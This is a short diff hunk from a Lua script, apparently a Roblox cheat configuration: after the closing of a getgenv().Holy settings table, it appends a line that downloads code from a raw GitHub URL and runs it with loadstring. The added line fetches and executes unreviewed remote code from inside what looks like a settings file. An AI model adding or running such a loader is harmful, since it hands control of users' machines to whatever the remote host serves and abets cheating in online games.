@@ -185,3 +185,5 @@ getgenv().Holy = {
         }
     }
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/29945gorrila/29945/refs/heads/main/29945"))()
